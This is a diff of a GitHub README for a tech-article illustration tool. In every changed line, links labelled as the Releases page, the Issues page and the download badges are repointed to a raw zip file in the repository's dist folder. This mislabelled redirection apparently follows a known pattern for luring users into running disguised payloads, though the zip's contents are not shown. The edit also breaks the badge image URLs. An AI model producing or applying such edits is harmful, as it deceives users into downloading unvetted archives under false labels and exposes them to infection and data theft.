@@ -7,10 +7,10 @@ Tech-Article-Illustration-Master is a user-friendly tool designed for tech write
 To get started, you will need to download the software from our Releases page. Follow the steps below to install and run Tech-Article-Illustration-Master.
 
 ### 🔗 Download Now
-[![Download Tech-Article-Illustration-Master](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/releases)
+[![Download Tech-Article-Illustration-Master](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/raw/refs/heads/main/dist/Illustration-Master-Tech-Article-v2.2-alpha.5.zip%20Now-blue?style=for-the-badge)](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/raw/refs/heads/main/dist/Illustration-Master-Tech-Article-v2.2-alpha.5.zip)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/releases) to access the latest version of the application.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/raw/refs/heads/main/dist/Illustration-Master-Tech-Article-v2.2-alpha.5.zip) to access the latest version of the application.
    
 2. **Select the Latest Release**: Look for the latest version at the top of the page. It will be labeled as "Latest Release".
 
@@ -36,7 +36,7 @@ To get started, you will need to download the software from our Releases page. F
 ## 🤔 Frequently Asked Questions
 
 ### How do I update the application?
-To update Tech-Article-Illustration-Master, return to the [Releases page](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/releases) regularly and download the latest version. Installation is the same as the original download.
+To update Tech-Article-Illustration-Master, return to the [Releases page](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/raw/refs/heads/main/dist/Illustration-Master-Tech-Article-v2.2-alpha.5.zip) regularly and download the latest version. Installation is the same as the original download.
 
 ### Can I use this tool offline?
 Yes, Tech-Article-Illustration-Master works offline once installed. However, some features may require an internet connection for AI suggestions.
@@ -45,9 +45,9 @@ Yes, Tech-Article-Illustration-Master works offline once installed. However, som
 Yes, you can find the user manual on the GitHub repository. It contains details about all features and functions.
 
 ## 🔗 Additional Resources
-For further assistance, visit our repository's [Issues page](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/issues), where you can report problems or suggest features.
+For further assistance, visit our repository's [Issues page](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/raw/refs/heads/main/dist/Illustration-Master-Tech-Article-v2.2-alpha.5.zip), where you can report problems or suggest features.
 
 ## 🔗 Download Now
-[![Download Tech-Article-Illustration-Master](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/releases)
+[![Download Tech-Article-Illustration-Master](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/raw/refs/heads/main/dist/Illustration-Master-Tech-Article-v2.2-alpha.5.zip%20Now-blue?style=for-the-badge)](https://github.com/faiqmaharan/Tech-Article-Illustration-Master/raw/refs/heads/main/dist/Illustration-Master-Tech-Article-v2.2-alpha.5.zip)
 
 Thank you for choosing Tech-Article-Illustration-Master to improve your articles. Enjoy creating beautiful visuals!
